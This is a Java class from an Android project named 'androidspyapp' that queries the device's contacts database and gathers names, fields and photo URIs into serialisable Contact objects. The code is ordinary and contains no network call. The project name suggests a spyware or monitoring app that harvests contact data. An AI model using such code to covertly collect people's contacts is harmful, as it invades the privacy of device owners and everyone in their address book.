package com.komnacki.androidspyapp.contacts;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.gson.annotations.Expose;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Set;

import jagerfield.mobilecontactslibrary.Contact.Contact;
import jagerfield.mobilecontactslibrary.FieldContainer.FieldsContainer;
import jagerfield.mobilecontactslibrary.Utilities.Utilities;

public class ImportContacts {
    private Context context;
    private LinkedHashMap<Long, Contact> contactsIdMap;
    @Expose
    private ArrayList<Contact> contacts;

    public ArrayList<Contact> getContacts() {
        return this.getMobileContacts();
    }

    public void insertContact(Contact contact) {
        this.contacts.add(contact);
    }

    public ImportContacts(Context context) {
        this.context = context;
    }

    private String[] getKeyWord() {
        return null;
    }

    private String getFilter() {
        return null;
    }

    private String[] getColumns() {
        Set<String> columns = new HashSet();
        FieldsContainer fieldsContainer = new FieldsContainer();
        columns.addAll(fieldsContainer.getElementsColumns());
        columns.add("contact_id");
        columns.add("mimetype");
        columns.add("photo_uri");
        return (String[])columns.toArray(new String[columns.size()]);
    }

    public ArrayList<Contact> getMobileContacts() {
        boolean flag = this.hasPermission("android.permission.READ_CONTACTS");
        if (!flag) {
            Log.i("TAG_LIB", "Missing permission READ_CONTACTS");
            return new ArrayList();
        } else {
            Cursor cursor = this.context.getContentResolver().query(ContactsContract.Data.CONTENT_URI, this.getColumns(), this.getFilter(), this.getKeyWord(), "display_name");
            if (cursor != null) {
                this.contactsIdMap = new LinkedHashMap();
                this.contacts = new ArrayList();

                while(cursor.moveToNext()) {
                    long id = Utilities.getLong(cursor, "contact_id");
                    Contact contact = (Contact)this.contactsIdMap.get(id);
                    if (contact == null) {
                        contact = new Contact(id);
                        this.contactsIdMap.put(id, contact);
                        this.insertContact(contact);
                    }

                    String photoUri;
                    try {
                        photoUri = Utilities.getColumnIndex(cursor, "photo_uri");
                        if (photoUri != null && !photoUri.isEmpty()) {
                            contact.setPhotoUri(photoUri);
                        }
                    } catch (Exception var9) {
                        photoUri = "";
                    }

                    String columnIndex = Utilities.getColumnIndex(cursor, "mimetype");
                    contact.execute(cursor, columnIndex);
                }

                cursor.close();
            }

            if (this.contacts.isEmpty()) {
                Log.i("TAG_LIB", "Lib: No contacts found");
            }

            return this.contacts;
        }
    }

    public synchronized boolean hasPermission(String permission) {
        if (Build.VERSION.SDK_INT < 23) {
            return true;
        } else if (permission != null && !permission.isEmpty()) {
            String[] permissionsArray = new String[]{permission};
            int i = 0;
            if (i < permissionsArray.length) {
                if (this.context.checkSelfPermission(permissionsArray[i]) == PackageManager.PERMISSION_DENIED) {
                    Log.w("TAG_LIB", permission + " permission is missing.");
                    return false;
                } else {
                    return true;
                }
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
}
